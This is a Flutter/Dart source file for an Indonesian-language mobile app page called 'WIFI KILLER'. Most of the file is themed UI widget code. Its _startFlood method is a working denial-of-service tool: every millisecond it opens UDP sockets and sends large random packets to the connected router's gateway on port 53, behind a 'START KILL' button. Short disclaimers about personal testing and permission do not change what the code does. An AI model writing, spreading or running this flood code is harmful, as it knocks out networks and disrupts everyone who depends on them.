// lib/wifi_internal.dart — Full 3 Style Support (FIXED)
import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'dart:ui';
import 'app_theme.dart';

// ═══════════════════════════════════════════════════════════
// GLOBAL PULSE
// ═══════════════════════════════════════════════════════════
class _Pulse {
  static final ValueNotifier<double> v = ValueNotifier<double>(0);
  static bool _started = false;
  static void ensureStarted() {
    if (_started) return;
    _started = true;
    _run();
  }
  static Future<void> _run() async {
    final sw = Stopwatch()..start();
    while (true) {
      await Future<void>.delayed(const Duration(milliseconds: 80));
      final t = (sw.elapsedMilliseconds % 1600) / 1600.0;
      v.value = t < 0.5 ? t * 2 : (1 - t) * 2;
    }
  }
}

// ═══════════════════════════════════════════════════════════
// HUD CORNER PAINTER
// ═══════════════════════════════════════════════════════════
class _HudCornerPainter extends CustomPainter {
  final Color color;
  const _HudCornerPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final p = Paint()
      ..color = color
      ..strokeWidth = 1.4
      ..style = PaintingStyle.stroke;
    final l = size.width * 0.5;
    canvas.drawLine(Offset.zero, Offset(l, 0), p);
    canvas.drawLine(Offset.zero, Offset(0, l), p);
    canvas.drawLine(
        Offset(size.width, size.height), Offset(size.width - l, size.height), p);
    canvas.drawLine(
        Offset(size.width, size.height), Offset(size.width, size.height - l), p);
  }

  @override
  bool shouldRepaint(_HudCornerPainter old) => old.color != color;
}

class _HudGridPainter extends CustomPainter {
  final Color color;
  const _HudGridPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final p = Paint()
      ..color = color
      ..strokeWidth = 0.6;
    const step = 28.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), p);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), p);
    }
  }

  @override
  bool shouldRepaint(_HudGridPainter old) => old.color != color;
}

// ═══════════════════════════════════════════════════════════
// LED
// ═══════════════════════════════════════════════════════════
class _Led extends StatelessWidget {
  final Color color;
  final double size;
  final bool blink;
  const _Led({required this.color, this.size = 8, this.blink = false});

  @override
  Widget build(BuildContext context) {
    final style = AppTheme.currentStyle.value;
    final isComic = style == ThemeStyle.comic3d;
    final isHud = style == ThemeStyle.hudTactical;

    if (isComic) {
      return Container(
        width: size,
        height: size,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          color: color,
          border: Border.all(color: Colors.black, width: size * 0.18),
        ),
      );
    }

    if (isHud) {
      if (!blink) {
        return Container(
          width: size,
          height: size,
          decoration: BoxDecoration(
            color: color,
            boxShadow: [
              BoxShadow(
                color: color.withOpacity(0.9),
                blurRadius: size * 1.8,
                spreadRadius: size * 0.3,
              ),
            ],
          ),
        );
      }
      return ValueListenableBuilder<double>(
        valueListenable: _Pulse.v,
        builder: (_, v, __) => Container(
          width: size,
          height: size,
          decoration: BoxDecoration(
            color: color.withOpacity(0.4 + v * 0.6),
            boxShadow: [
              BoxShadow(
                color: color.withOpacity(0.9),
                blurRadius: size * 1.8,
                spreadRadius: size * 0.3,
              ),
            ],
          ),
        ),
      );
    }

    if (!blink) return _dot(1.0);
    return ValueListenableBuilder<double>(
      valueListenable: _Pulse.v,
      builder: (_, v, __) => _dot(0.45 + v * 0.55),
    );
  }

  Widget _dot(double opacity) => Container(
        width: size,
        height: size,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          gradient: RadialGradient(
            center: const Alignment(-0.35, -0.35),
            colors: [
              Colors.white.withOpacity(0.85 * opacity),
              color.withOpacity(opacity),
              color.withOpacity(0.55 * opacity),
            ],
            stops: const [0.0, 0.4, 1.0],
          ),
          border: Border.all(
              color: Colors.black.withOpacity(0.85), width: size * 0.1),
          boxShadow: [
            BoxShadow(
                color: color.withOpacity(0.75 * opacity),
                blurRadius: size * 1.4,
                spreadRadius: size * 0.2),
          ],
        ),
      );
}

// ═══════════════════════════════════════════════════════════
// SCREW
// ═══════════════════════════════════════════════════════════
class _Screw extends StatelessWidget {
  final AppPalette C;
  final double size;
  const _Screw({required this.C, this.size = 14});

  @override
  Widget build(BuildContext context) {
    final style = AppTheme.currentStyle.value;
    final isComic = style == ThemeStyle.comic3d;
    final isHud = style == ThemeStyle.hudTactical;

    if (isComic) return const SizedBox.shrink();
    if (isHud) {
      return SizedBox(
        width: size,
        height: size,
        child: CustomPaint(
          painter: _HudCornerPainter(color: C.accent.withOpacity(0.7)),
        ),
      );
    }
    return Container(
      width: size,
      height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        gradient: RadialGradient(
          center: const Alignment(-0.35, -0.35),
          colors: [C.text, C.textSub, C.bg, C.bgDark],
          stops: const [0.0, 0.35, 0.7, 1.0],
        ),
      ),
      child: Center(
        child: Transform.rotate(
          angle: 0.785,
          child: Container(
            width: size * 0.7,
            height: size * 0.11,
            color: Colors.black.withOpacity(0.9),
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// RIVET
// ═══════════════════════════════════════════════════════════
class _Rivet extends StatelessWidget {
  final AppPalette C;
  final double size;
  const _Rivet({required this.C, this.size = 10});

  @override
  Widget build(BuildContext context) {
    final style = AppTheme.currentStyle.value;
    final isComic = style == ThemeStyle.comic3d;
    final isHud = style == ThemeStyle.hudTactical;

    if (isComic) return const SizedBox.shrink();
    if (isHud) {
      return Container(
        width: size,
        height: size,
        decoration: BoxDecoration(
          border: Border.all(color: C.accent.withOpacity(0.6), width: 1),
        ),
      );
    }
    return Container(
      width: size,
      height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        gradient: RadialGradient(
          center: const Alignment(-0.35, -0.35),
          colors: [C.accentShine, C.accentHi, C.accent, C.primaryLo],
          stops: const [0.0, 0.3, 0.65, 1.0],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// METAL PLATE
// ═══════════════════════════════════════════════════════════
class _MetalPlate extends StatelessWidget {
  final AppPalette C;
  final Widget child;
  final EdgeInsets padding;
  final bool brass;
  final double radius;
  const _MetalPlate({
    required this.C,
    required this.child,
    this.padding = const EdgeInsets.all(16),
    this.brass = false,
    this.radius = 16,
  });

  @override
  Widget build(BuildContext context) {
    final style = AppTheme.currentStyle.value;
    final isComic = style == ThemeStyle.comic3d;
    final isHud = style == ThemeStyle.hudTactical;

    if (isComic) {
      return Container(
        padding: padding,
        decoration: BoxDecoration(
          color: brass ? C.primaryHi : C.bgDark,
          borderRadius: BorderRadius.circular(radius + 4),
          border: Border.all(color: Colors.black, width: 4),
          boxShadow: const [
            BoxShadow(
                color: Colors.black, offset: Offset(5, 5), blurRadius: 0),
          ],
        ),
        child: child,
      );
    }

    if (isHud) {
      return Container(
        decoration: BoxDecoration(
          color: C.hudPanel(),
          border: Border.all(color: C.hudBorder(), width: 1.2),
          boxShadow: [
            BoxShadow(color: C.accent.withOpacity(0.15), blurRadius: 12),
          ],
        ),
        child: Stack(
          children: [
            Padding(padding: padding, child: child),
            Positioned(top: 0, left: 0, child: _corner(C)),
            Positioned(top: 0, right: 0, child: _corner(C)),
            Positioned(bottom: 0, left: 0, child: _corner(C)),
            Positioned(bottom: 0, right: 0, child: _corner(C)),
          ],
        ),
      );
    }

    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(radius),
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: brass
              ? [C.accentHi, C.accent, C.primary, C.primaryLo]
              : [C.text, C.bg, C.bgDark, C.bgDeep],
          stops: const [0.0, 0.4, 0.7, 1.0],
        ),
        boxShadow: [
          BoxShadow(
              color: Colors.black.withOpacity(0.75),
              offset: const Offset(0, 6),
              blurRadius: 12),
        ],
      ),
      padding: const EdgeInsets.all(3),
      child: Container(
        padding: padding,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(radius - 3),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [C.bg, C.bgDark, C.bgDeep],
          ),
          border: Border.all(color: Colors.black.withOpacity(0.5)),
        ),
        child: child,
      ),
    );
  }

  Widget _corner(AppPalette C) => SizedBox(
        width: 12,
        height: 12,
        child: CustomPaint(
          painter: _HudCornerPainter(color: C.accent.withOpacity(0.8)),
        ),
      );
}

// ═══════════════════════════════════════════════════════════
// WIFI KILLER PAGE
// ═══════════════════════════════════════════════════════════
class WifiKillerPage extends StatefulWidget {
  const WifiKillerPage({super.key});

  @override
  State<WifiKillerPage> createState() => _WifiKillerPageState();
}

class _WifiKillerPageState extends State<WifiKillerPage> {
  String ssid = "-";
  String ip = "-";
  String frequency = "-";
  String routerIp = "-";
  bool isKilling = false;
  Timer? _loopTimer;

  @override
  void initState() {
    super.initState();
    _Pulse.ensureStarted();
    _loadWifiInfo();
  }

  Future<void> _loadWifiInfo() async {
    final info = NetworkInfo();
    final status = await Permission.locationWhenInUse.request();
    if (!status.isGranted) {
      _showAlert("Permission Denied",
          "Akses lokasi diperlukan untuk membaca info WiFi.");
      return;
    }

    try {
      final name = await info.getWifiName();
      final ipAddr = await info.getWifiIP();
      final gateway = await info.getWifiGatewayIP();

      setState(() {
        ssid = name ?? "-";
        ip = ipAddr ?? "-";
        routerIp = gateway ?? "-";
        frequency = "-";
      });
    } catch (e) {
      setState(() {
        ssid = ip = frequency = routerIp = "Error";
      });
    }
  }

  void _startFlood() {
    if (routerIp == "-" || routerIp == "Error") {
      _showAlert("❌ Error", "Router IP tidak tersedia.");
      return;
    }

    setState(() => isKilling = true);
    _showAlert("✅ Started", "WiFi Killer!\nStop Manually.");

    const targetPort = 53;
    final List<int> payload =
        List<int>.generate(65495, (_) => Random().nextInt(256));

    _loopTimer = Timer.periodic(const Duration(milliseconds: 1), (_) async {
      try {
        for (int i = 0; i < 2; i++) {
          final socket =
              await RawDatagramSocket.bind(InternetAddress.anyIPv4, 0);
          for (int j = 0; j < 9; j++) {
            socket.send(payload, InternetAddress(routerIp), targetPort);
          }
          socket.close();
        }
      } catch (_) {}
    });
  }

  void _stopFlood() {
    setState(() => isKilling = false);
    _loopTimer?.cancel();
    _loopTimer = null;
    _showAlert("🛑 Stopped", "WiFi flood attack dihentikan.");
  }

  void _showAlert(String title, String message) {
    final C = AppTheme.current.value;
    final style = AppTheme.currentStyle.value;
    final isComic = style == ThemeStyle.comic3d;
    final isHud = style == ThemeStyle.hudTactical;

    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: _MetalPlate(
          C: C,
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Row(
                children: [
                  _Led(color: C.primaryHi, size: 8, blink: !isComic),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Text(
                      title,
                      style: TextStyle(
                        color: isComic
                            ? C.comicText
                            : (isHud ? C.hudNeon() : C.accent),
                        fontFamily: isComic ? 'Bangers' : 'Orbitron',
                        fontWeight: FontWeight.w900,
                        fontSize: isComic ? 18 : 13,
                        letterSpacing: isComic ? 2 : 2.5,
                        shadows: isComic
                            ? [
                                Shadow(
                                    color: C.comicTextOutline,
                                    offset: const Offset(1, 1),
                                    blurRadius: 0),
                              ]
                            : (isHud
                                ? [
                                    Shadow(
                                        color: C.accent.withOpacity(0.5),
                                        blurRadius: 8),
                                  ]
                                : null),
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 16),
              Text(
                message,
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: isComic
                      ? C.comicText
                      : (isHud ? C.hudText() : C.text.withOpacity(0.85)),
                  fontSize: 12,
                  fontFamily: isComic ? 'ComicNeue' : 'ShareTechMono',
                  height: 1.5,
                ),
              ),
              const SizedBox(height: 20),
              _buildActionButton(
                text: 'OK',
                icon: Icons.check_rounded,
                onPressed: () => Navigator.pop(context),
                color: C.primaryHi,
                height: 44,
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInfoRow(AppPalette C, bool isComic, bool isHud,
      String label, String value) {
    return Container(
      margin: const EdgeInsets.symmetric(vertical: 6),
      padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 12),
      decoration: isHud
          ? BoxDecoration(
              color: C.bgDeep.withOpacity(0.6),
              border:
                  Border.all(color: C.accent.withOpacity(0.4), width: 1),
            )
          : BoxDecoration(
              color: isComic
                  ? Colors.white
                  : Colors.white.withOpacity(0.05),
              borderRadius: BorderRadius.circular(isComic ? 10 : 8),
              border: Border.all(
                  color: isComic
                      ? Colors.black
                      : C.primaryHi.withOpacity(0.2),
                  width: isComic ? 3 : 1),
            ),
      child: Row(
        children: [
          Text(
            "$label: ",
            style: TextStyle(
              color: isComic
                  ? Colors.black
                  : (isHud ? C.hudNeon() : C.primaryHi),
              fontWeight: FontWeight.bold,
              fontSize: isComic ? 13 : 12,
              fontFamily: isComic ? 'Bangers' : 'Orbitron',
              letterSpacing: isHud ? 1 : 0,
              shadows: isHud
                  ? [
                      Shadow(
                          color: C.accent.withOpacity(0.5),
                          blurRadius: 4),
                    ]
                  : null,
            ),
          ),
          Expanded(
            child: Text(
              value,
              textAlign: TextAlign.right,
              style: TextStyle(
                color: isComic
                    ? Colors.black
                    : (isHud ? C.hudText() : Colors.white),
                fontWeight: FontWeight.bold,
                fontSize: isComic ? 13 : 12,
                fontFamily: isComic ? 'ComicNeue' : 'ShareTechMono',
                letterSpacing: isHud ? 0.5 : 0,
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildActionButton({
    required String text,
    required IconData icon,
    required VoidCallback onPressed,
    required Color color,
    double height = 56,
  }) {
    final C = AppTheme.current.value;
    final style = AppTheme.currentStyle.value;
    final isComic = style == ThemeStyle.comic3d;
    final isHud = style == ThemeStyle.hudTactical;

    final textColor =
        isComic ? C.contrastTextOn(color) : (isHud ? color : Colors.white);

    return GestureDetector(
      onTap: onPressed,
      child: Container(
        height: height,
        decoration: isHud
            ? BoxDecoration(
                color: color.withOpacity(0.15),
                border: Border.all(color: color, width: 1.4),
                boxShadow: [
                  BoxShadow(
                      color: color.withOpacity(0.5), blurRadius: 12),
                ],
              )
            : BoxDecoration(
                borderRadius: BorderRadius.circular(isComic ? 16 : 14),
                gradient: isComic
                    ? null
                    : LinearGradient(colors: [
                        color.withOpacity(0.9),
                        color.withOpacity(0.7),
                      ]),
                color: isComic ? color : null,
                border: Border.all(
                    color: isComic ? Colors.black : color.withOpacity(0.9),
                    width: isComic ? 4 : 1.5),
                boxShadow: isComic
                    ? const [
                        BoxShadow(
                            color: Colors.black,
                            offset: Offset(4, 4),
                            blurRadius: 0),
                      ]
                    : null,
              ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, color: textColor, size: isComic ? 22 : 20),
            const SizedBox(width: 12),
            Text(
              text,
              style: TextStyle(
                color: textColor,
                fontWeight: FontWeight.bold,
                fontSize: isComic ? 18 : 14,
                fontFamily: isComic ? 'Bangers' : 'Orbitron',
                letterSpacing: isComic ? 1.2 : 2,
                shadows: isComic
                    ? [
                        Shadow(
                            color: textColor == Colors.white
                                ? Colors.black
                                : Colors.white,
                            offset: const Offset(2, 2),
                            blurRadius: 0),
                      ]
                    : (isHud
                        ? [
                            Shadow(
                                color: color.withOpacity(0.7),
                                blurRadius: 8),
                          ]
                        : null),
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  void dispose() {
    _loopTimer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<AppPalette>(
      valueListenable: AppTheme.current,
      builder: (context, C, _) {
        return ValueListenableBuilder<ThemeStyle>(
          valueListenable: AppTheme.currentStyle,
          builder: (context, style, __) {
            final isComic = style == ThemeStyle.comic3d;
            final isHud = style == ThemeStyle.hudTactical;

            return Scaffold(
              backgroundColor:
                  isComic ? C.bg : (isHud ? C.hudBg() : C.bgDeep),
              body: Stack(
                children: [
                  if (isComic)
                    Positioned.fill(
                      child: Container(
                        color: C.bg,
                        child: CustomPaint(
                          painter: _ComicHalftonePainter(
                              color: C.primaryLo.withOpacity(0.12)),
                        ),
                      ),
                    )
                  else if (isHud)
                    Positioned.fill(
                      child: Container(
                        color: C.hudBg(),
                        child: CustomPaint(
                          painter:
                              _HudGridPainter(color: C.hudGridLine()),
                        ),
                      ),
                    )
                  else ...[
                    Positioned(
                      top: -100,
                      right: -100,
                      child: Container(
                        width: 300,
                        height: 300,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(colors: [
                            C.primaryHi.withOpacity(0.1),
                            Colors.transparent,
                          ]),
                        ),
                      ),
                    ),
                    Positioned(
                      bottom: -150,
                      left: -100,
                      child: Container(
                        width: 400,
                        height: 400,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(colors: [
                            C.primary.withOpacity(0.08),
                            Colors.transparent,
                          ]),
                        ),
                      ),
                    ),
                  ],
                  SafeArea(
                    child: SingleChildScrollView(
                      padding: const EdgeInsets.all(16),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          _MetalPlate(
                            C: C,
                            padding: const EdgeInsets.all(20),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(Icons.wifi_off,
                                    color: isComic
                                        ? C.contrastTextOn(C.primaryHi)
                                        : (isHud
                                            ? C.hudNeon()
                                            : C.primaryHi),
                                    size: 32),
                                const SizedBox(width: 12),
                                Text(
                                  "WIFI KILLER",
                                  style: TextStyle(
                                    fontSize: isComic ? 24 : 20,
                                    fontWeight: FontWeight.bold,
                                    fontFamily:
                                        isComic ? 'Bangers' : 'Orbitron',
                                    letterSpacing: isComic ? 1.5 : 2.5,
                                    color: isComic
                                        ? C.comicText
                                        : (isHud ? C.hudNeon() : C.text),
                                    shadows: isHud
                                        ? [
                                            Shadow(
                                                color: C.accent
                                                    .withOpacity(0.5),
                                                blurRadius: 8),
                                          ]
                                        : null,
                                  ),
                                ),
                              ],
                            ),
                          ),
                          const SizedBox(height: 20),
                          _MetalPlate(
                            C: C,
                            padding: const EdgeInsets.all(20),
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Row(
                                  children: [
                                    Icon(Icons.warning,
                                        color: isComic
                                            ? C.comicText
                                            : (isHud
                                                ? C.hudWarning()
                                                : C.primaryHi),
                                        size: 20),
                                    const SizedBox(width: 8),
                                    Text(
                                      "Warning",
                                      style: TextStyle(
                                        color: isComic
                                            ? C.comicText
                                            : (isHud
                                                ? C.hudWarning()
                                                : C.primaryHi),
                                        fontSize: isComic ? 18 : 14,
                                        fontWeight: FontWeight.bold,
                                        fontFamily: isComic
                                            ? 'Bangers'
                                            : 'Orbitron',
                                        letterSpacing:
                                            isComic ? 1.5 : 1.5,
                                      ),
                                    ),
                                  ],
                                ),
                                const SizedBox(height: 12),
                                Text(
                                  "Feature ini mampu mematikan jaringan WiFi yang anda sambung.\n\n⚠️ Gunakan hanya untuk testing pribadi. Risiko ditanggung pengguna.",
                                  style: TextStyle(
                                    color: isComic
                                        ? C.comicText.withOpacity(0.85)
                                        : (isHud
                                            ? C.hudText()
                                            : Colors.white70),
                                    fontSize: 12,
                                    height: 1.5,
                                    fontFamily: isComic
                                        ? 'ComicNeue'
                                        : 'ShareTechMono',
                                    letterSpacing: isHud ? 0.5 : 0,
                                  ),
                                ),
                              ],
                            ),
                          ),
                          const SizedBox(height: 20),
                          _MetalPlate(
                            C: C,
                            padding: const EdgeInsets.all(20),
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Row(
                                  children: [
                                    Icon(Icons.network_wifi,
                                        color: isComic
                                            ? C.comicText
                                            : (isHud
                                                ? C.hudNeon()
                                                : C.primaryHi),
                                        size: 24),
                                    const SizedBox(width: 12),
                                    Text(
                                      "Network Information",
                                      style: TextStyle(
                                        fontSize: isComic ? 18 : 15,
                                        fontWeight: FontWeight.bold,
                                        color: isComic
                                            ? C.comicText
                                            : (isHud
                                                ? C.hudNeon()
                                                : C.text),
                                        fontFamily: isComic
                                            ? 'Bangers'
                                            : 'Orbitron',
                                        letterSpacing:
                                            isComic ? 1.5 : 2,
                                        shadows: isHud
                                            ? [
                                                Shadow(
                                                    color: C.accent
                                                        .withOpacity(0.5),
                                                    blurRadius: 8),
                                              ]
                                            : null,
                                      ),
                                    ),
                                  ],
                                ),
                                const SizedBox(height: 16),
                                _buildInfoRow(
                                    C, isComic, isHud, "SSID", ssid),
                                _buildInfoRow(C, isComic, isHud,
                                    "IP Address", ip),
                                _buildInfoRow(C, isComic, isHud,
                                    "Frequency", "$frequency MHz"),
                                _buildInfoRow(C, isComic, isHud,
                                    "Router IP", routerIp),
                              ],
                            ),
                          ),
                          const SizedBox(height: 32),
                          Center(
                            child: _buildActionButton(
                              text:
                                  isKilling ? "STOP ATTACK" : "START KILL",
                              icon: isKilling
                                  ? Icons.stop
                                  : Icons.wifi_off,
                              onPressed:
                                  isKilling ? _stopFlood : _startFlood,
                              color: isKilling
                                  ? (isHud
                                      ? C.hudWarning()
                                      : C.primaryHi)
                                  : C.primaryHi,
                            ),
                          ),
                          const SizedBox(height: 20),
                          if (isKilling)
                            Center(
                              child: Column(
                                children: [
                                  const SizedBox(height: 16),
                                  Container(
                                    padding: const EdgeInsets.all(16),
                                    decoration: BoxDecoration(
                                      shape: isHud
                                          ? BoxShape.rectangle
                                          : BoxShape.circle,
                                      color: isHud
                                          ? C.primaryHi.withOpacity(0.15)
                                          : null,
                                      gradient: (!isHud)
                                          ? LinearGradient(colors: [
                                              C.primaryHi.withOpacity(0.3),
                                              C.primaryHi.withOpacity(0.1),
                                            ])
                                          : null,
                                      border: Border.all(
                                          color: C.primaryHi
                                              .withOpacity(0.5),
                                          width: isHud ? 1.2 : 1),
                                    ),
                                    child: CircularProgressIndicator(
                                      color: C.primaryHi,
                                      strokeWidth: 3,
                                    ),
                                  ),
                                  const SizedBox(height: 16),
                                  Text(
                                    "Attack in progress...",
                                    style: TextStyle(
                                      color: isComic
                                          ? C.comicText
                                          : (isHud
                                              ? C.hudNeon()
                                              : C.primaryHi),
                                      fontSize: isComic ? 16 : 14,
                                      fontWeight: FontWeight.bold,
                                      fontFamily: isComic
                                          ? 'Bangers'
                                          : 'Orbitron',
                                      letterSpacing: isComic ? 1.5 : 2,
                                      shadows: isHud
                                          ? [
                                              Shadow(
                                                  color: C.accent
                                                      .withOpacity(0.5),
                                                  blurRadius: 8),
                                            ]
                                          : null,
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          const SizedBox(height: 20),
                          _MetalPlate(
                            C: C,
                            padding: const EdgeInsets.all(16),
                            child: Row(
                              children: [
                                Icon(Icons.info,
                                    color: isComic
                                        ? C.comicText
                                        : (isHud
                                            ? C.hudNeon()
                                            : C.primaryHi),
                                    size: 20),
                                const SizedBox(width: 12),
                                Expanded(
                                  child: Text(
                                    "Pastikan Anda memiliki izin sebelum menggunakan tool ini",
                                    style: TextStyle(
                                      color: isComic
                                          ? C.comicText.withOpacity(0.85)
                                          : (isHud
                                              ? C.hudTextDim()
                                              : Colors.white70),
                                      fontSize: 11,
                                      fontFamily: isComic
                                          ? 'ComicNeue'
                                          : 'ShareTechMono',
                                      letterSpacing: isHud ? 0.5 : 0,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            );
          },
        );
      },
    );
  }
}

// ═══════════════════════════════════════════════════════════
// COMIC HALFTONE PAINTER
// ═══════════════════════════════════════════════════════════
class _ComicHalftonePainter extends CustomPainter {
  final Color color;
  const _ComicHalftonePainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    const spacing = 22.0;
    final paint = Paint()..color = color;
    for (double x = 0; x < size.width + spacing; x += spacing) {
      for (double y = 0; y < size.height + spacing; y += spacing) {
        canvas.drawCircle(Offset(x, y), 2.5, paint);
      }
    }
  }

  @override
  bool shouldRepaint(_ComicHalftonePainter old) => old.color != color;
}